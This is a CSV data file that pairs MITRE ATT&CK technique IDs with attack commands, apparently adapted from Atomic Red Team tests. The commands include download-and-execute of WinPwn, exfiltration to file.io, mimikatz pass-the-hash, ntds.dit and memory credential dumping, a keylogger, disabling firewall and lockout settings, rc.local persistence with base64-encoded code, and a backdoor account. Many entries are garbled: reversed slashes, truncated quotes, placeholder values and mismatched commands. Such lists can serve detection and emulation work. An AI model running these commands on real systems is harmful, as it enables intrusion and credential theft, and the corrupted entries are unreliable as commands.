mitre_id,command
T1016,"if [ ""$(uname)"" = 'freebsd' ]; then cmd=""netstat -sp tcp""; else cmd=""netstat -ant""; fi; if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi; if [ -x ""$(command -v ifconfig)"" ]; then ifconfig; else echo ""ifconfig is missing from the machine. skipping...""; fi; if [ -x ""$(command -v ip)"" ]; then ip addr; else echo ""ip is missing from the machine. skipping...""; fi; if [ -x ""$(command -v netstat)"" ]; then $cmd | awk '{print $nf}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo ""netstat is missing from the machine. skipping...""; fi;"
T1047,wmic useraccount get \all \format:csv
T1027,go run var_754
T1491,"$orglegalnoticecaption = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption).legalnoticecaption $orglegalnoticetext = (get-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext).legalnoticetext $newlegalnoticecaption = ""var_405"" set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticecaption -value $newlegalnoticecaption -type string -force set-itemproperty hklm:\software\microsoft\windows\currentversion\policies\system -name legalnoticetext -value $newlegalnoticetext -type string -force"
T1021,"$server=#{logonserver} $user = join-path #{domain} #{username} $password=""#{password}"" cmdkey /generic:termsrv/$server /user:$user /pass:$password mstsc /v:$server echo ""rdp connection established"""
T1012,"reg query ""hklm\software\microsoft\windows nt\currentversion\windows"" reg query hklm\software\microsoft\windows\currentversion\runservicesonce reg query hkcu\software\microsoft\windows\currentversion\runservicesonce reg query hklm\software\microsoft\windows\currentversion\runservices reg query hkcu\software\microsoft\windows\currentversion\runservices reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\notify"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\userinit"" reg query ""hkcu\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query hklm\software\microsoft\windows\currentversion\shellserviceobjectdelayload reg query hklm\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\runonceex reg query hklm\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\policies\explorer\run reg query hkcu\software\microsoft\windows\currentversion\policies\explorer\run reg query hklm\system\currentcontrolset\services \s | findstr imagepath 2>nul | findstr \ri "".*\.sys$"" reg query hklm\software\microsoft\windows\currentversion\run reg query hklm\system\currentcontrolset\control\safeboot reg query ""hklm\software\microsoft\active setup\installed components"" reg query ""hklm\software\microsoft\windows\currentversion\group policy\scripts\startup"""
T1020,"$filename = ""var_543"
T1562,set-powercliconfiguration -invalidcertificateaction ignore -participateinceip:$false -confirm:$false connect-viserver -server #{vm_host} -user #{vm_user} -password #{vm_pass} get-advancedsetting -entity #{vm_host} -name 'security.accountlockfailures' | set-advancedsetting -value '0' -confirm:$false disconnect-viserver -confirm:$false
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')"""
T1014,sudo  modprobe  var_960
T1482,"dsquery * -filter ""(objectclass=trusteddomain)"" -attr *"
T1005,"osascript  -e  'tell  application  ""finder""'  -e  'set  destinationfolderpath  to  posix  file  ""var_995  of  notesfolder'  -e  'repeat  with  afile  in  notesfiles'  -e  'duplicate  afile  to  folder  destinationfolderpath  with  replacing'  -e  'end'  -e  'end  tell'"
T1048,"wget --post-file=""var_985 --delete-after"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_579 write-host ""end of golden saml"""
T1486,$which_7z a -pvar_469
T1003,"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") mem_start=$(head -n 5 /proc/""${pid}""/map | tail -1 | cut -d' ' -f1) mem_stop=$(head -n 5 /proc/""${pid}""/map | tail -1 | cut -d' ' -f2) mem_size=$(echo $(($mem_stop-$mem_start))) dd if=/proc/""${pid}""/mem of=""#{output_file}"" ibs=1 skip=""$mem_start"" count=""$mem_size"" strings ""#{output_file}"" | grep -i pass"
T1056,"&""$pathtoatomicsfolder\t1056.001\src\get-keystrokes.ps1"" -logpath var_983"
T1221,"start ""var_361"""
T1195,"kubectl run var_820 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1120,"get-wmiobject  win32_pnpentity  |  format-table  name,  description,  manufacturer  >  $env:temp\t1120_collection.txt  $space,$heading,$break,$data  =  get-content  $env:temp\t1120_collection.txt  @($heading;  $break;  $data  |sort-object  -unique)  |  ?  {$_.trim()  -ne  """"  }  |set-content  $env:temp\t1120_collection.txt"
T1496,yes > \dev\null
T1071,"curl -s -a ""httpbrowser\1.0"" -m3 var_255"
T1071,var_649
T1105,"cd ""%programdata%\microsoft\windows defender\platform\4.18*"" mpcmdrun.exe -downloadfile -url #{remote_file} -path #{local_path}"
T1553,"mount-diskimage  -imagepath  ""var_999"""
T1074,"compress-archive -path ""var_130 -force"
T1573,$server_ip = var_876
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_861"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_150""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1055,$process  =  start-process  var_939  -passthru  $pathtoatomicsfolder\t1055\bin\x64\createremotethreadnative.exe  -pid  $process.id  -debug
T1560,"mkdir -p #{test_folder} cd #{test_folder}; touch a b c d e f g zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./* echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip ls -l #{test_folder}"
T1001,"get-content ""var_455"" -encoding byte"
T1018,"([adsisearcher]""objectcategory=computer"").findall(); ([adsisearcher]""objectcategory=computer"").findone()"
T1580,"export aws_region=var_433 echo ""stratus: start warmup."" .\stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" .\stratus detonate aws.discovery.ec2-enumerate-from-instance"
T1562,netsh advfirewall set currentprofile state off
T1217,"$url_regex = '(htt(p|s)):\\([\w-]+\.)+[\w-]+(\[\w- .\?%&=]*)*?' $history = get-content -path ""var_407"""
T1202,"scriptrunner.exe -appvscript ""var_766"""
T1040,sudo var_477 -t 3
T1083,ls -recurse get-childitem -recurse gci -recurse
T1489,"echo ""e"" > \proc\sysrq-trigger"
T1018,nltest.exe /dclist:#{target_domain}
T1219,"start-process ""shell:appsfolder\microsoftcorporationii.quickassist_8wekyb3d8bbwe!app"""
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_286"""
T1550,"#{mimikatz_path} ""sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"""
T1003,copy #{vsc_name}\windows\ntds\ntds.dit #{extract_path}\ntds.dit copy #{vsc_name}\windows\system32\config\system #{extract_path}\vsc_system_hive reg save hklm\system #{extract_path}\system_hive
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1202,# copy command to clipboard set-clipboard -value 'var_126')
T1053,"kubectl  run  var_194  &&  at  -l"""
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_662"
T1571,echo quit | telnet var_667 exit 0
T1049,sockstat -4 sockstat -6 2>\dev\null || true sockstat -l 2>\dev\null || true
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_250"""
T1036,copy %systemroot%\system32\cmd.exe %systemroot%\temp\lsass.exe %systemroot%\temp\lsass.exe \b
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe"""
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive\t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1221,"start ""var_259"""
T1518,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') dotnetsearch -noninteractive -consoleoutput
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_678
T1082,"cscript  ""var_293"""
T1136,pw useradd var_654 -s \usr\sbin\nologin -d \nonexistent -c evil_account
T1007,net.exe start >> var_569
T1197,bitsadmin.exe  \create  var_423
T1018,"""var_673"
T1548,"""#{uacme_exe}"""
T1505,"$termsrvdll = ""%systemroot%\system32\termsrv.dll"" $acl = get-acl $termsrvdll $permission = ""administrators"",""fullcontrol"",""allow"" $accessrule = new-object system.security.accesscontrol.filesystemaccessrule $permission $acl.setaccessrule($accessrule) set-acl -path $termsrvdll -aclobject $acl copy-item -path $termsrvdll -destination ""$home\atomictest.dll"" $newservicedll = ""$home\atomictest.dll"" $registrypath = ""hklm:\system\currentcontrolset\services\termservice\parameters"" # check if the registry key exists if (test-path -path $registrypath) { # modify the servicedll value in the registry set-itemproperty -path $registrypath -name ""servicedll"" -value $newservicedll write-host ""servicedll value in the registry has been updated to: $newservicedll"" } else { write-host ""registry key not found. make sure the 'termservice\parameters' key exists."" }"
T1127,"copy  ""var_431  %temp%\hello.js"
T1049,"get-nettcpconnection  |  foreach-object  {  $p  =  get-process  -id  $_.owningprocess  -erroraction  silentlycontinue  [pscustomobject]@{  local  =  ""$($_.localaddress):$($_.localport)""  remote  =  ""$($_.remoteaddress):$($_.remoteport)""  state  =  $_.state  pid  =  $_.owningprocess  process  =  if  ($p)  {  $p.processname  }  else  {  $null  }  }  }  |  sort-object  state,process  |  format-table  -autosize"
T1221,"start ""var_758"""
T1078,dseditgroup -o edit -a art-user -t user admin
T1003,"""#{venv_path}\scripts\pypykatz"" live lsa"
T1046,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') fruit -noninteractive -consoleoutput
T1202,"scriptrunner.exe -appvscript ""#{payload_path}"""
T1003,#{xordump_exe} -out #{output_file} -x 0x41
T1140,encoded=$(echo 'var_325 | b64decode -r
T1037,"filename='\etc\rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename \etc\rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!\usr\local\bin\bash' | sudo tee \etc\rc.local || printf '#!\bin\bash' | sudo tee \etc\rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a \etc\rc.local printf 'exit 0' | sudo tee -a \etc\rc.local sudo chmod +x \etc\rc.local"
T1006,"$buffer  =  new-object  byte[]  11  $handle  =  new-object  io.filestream  ""\\.\var_272"",  'open',  'read',  'readwrite'  $handle.read($buffer,  0,  $buffer.length)  $handle.close()  format-hex  -inputobject  $buffer"
T1518,"get-process | ?{$_.description -like ""*virus*""} get-process | ?{$_.description -like ""*carbonblack*""} get-process | ?{$_.description -like ""*defender*""} get-process | ?{$_.description -like ""*cylance*""} get-process | ?{$_.description -like ""*mc*""} get-process | ?{$_.processname -like ""*mc*""} get-process | where-object { $_.processname -eq ""sysmon"" }"
T1090,"& ""pathtoatomicsfolder\t1090.003\src\psiphon.bat"""
T1573,$server_ip = var_270
T1552,"find #{file_path}/.oci/sessions -name ""token"" -type f 2>/dev/null"
T1547,sudo defaults write com.apple.loginwindow loginhook #{script}
T1048,curl -f 'file=@var_160' -f 'maxdownloads=1' -f 'autodelete=true' https:\\file.io\
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_117
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1489,net.exe stop var_528
T1491,"$notepath = join-path $env:temp ""var_317"" $header = $title + ""`r`n"" + ('=' * $title.length) + ""`r`n`r`n"" $content = $header + $body [system.io.file]::writealltext($notepath, $content, [system.text.encoding]::utf8) $p = start-process notepad.exe -argumentlist ""`""$notepath`"""" -passthru $p.id | out-file -filepath $pidpath -encoding ascii -force"
